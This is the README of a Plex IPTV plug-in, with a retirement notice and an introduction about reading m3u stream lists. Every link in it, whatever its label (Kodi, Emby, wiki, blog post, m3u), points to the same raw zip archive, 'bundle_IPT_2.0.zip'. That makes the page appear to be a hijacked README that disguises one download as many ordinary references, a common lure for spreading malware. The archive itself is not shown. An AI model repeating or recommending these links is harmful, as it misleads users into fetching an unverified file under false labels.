### Attention! ###
[**Plex has retired plug-ins functionality!**](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) This plug-in still works, however most Plex clients and apps do not show any plug-ins at all, including this one. So this is the end. It was a fun project despite a bit deserted by me for last year, because some time ago I switched to [Kodi](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) as a frontend and [Emby](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) as a backend for my multimedia needs, including [IPTV](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip). You can read my [blog post](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) for more IPTV alternatives if you want. Good luck and take care.

### Introduction ###
A simple [Plex Media Servers](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) plug-in that reads live streams (like [IPTV](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip)) urls from a [m3u](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) file and passes 'em to Plex in format understandable to Plex so it could try to play them.

In short, as title states, it lets You watch IPTV in Plex.

It also has a basic program guide, categories, custom logos and other goodies, **please read the [wiki](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip)** for information on how to set all up.

_Important note:_ Playback is handled by Plex itself, not the plug-in, and many streams are not playable by many Plex players, **please read the [wiki](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip)** for more information and possible [solutions](https://github.com/EddyBarrragan/IPTV.bundle/raw/refs/heads/master/Contents/bundle_IPT_2.0.zip) if Your desired stream does not work.
